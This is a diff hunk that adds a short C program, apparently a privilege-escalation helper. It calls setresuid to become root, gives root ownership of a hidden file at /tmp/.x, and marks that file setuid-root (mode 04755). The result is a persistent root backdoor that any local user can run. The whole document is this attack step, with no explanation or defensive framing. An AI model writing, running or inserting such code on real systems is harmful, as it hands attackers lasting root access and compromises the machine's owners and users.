@@ -1,0 +1,6 @@
+int main() {
+  if (setresuid(0,0,0) < 0)
+    perror("setresuid");
+  chown("/tmp/.x", 0, 0);
+  chmod("/tmp/.x", 04755);
+}
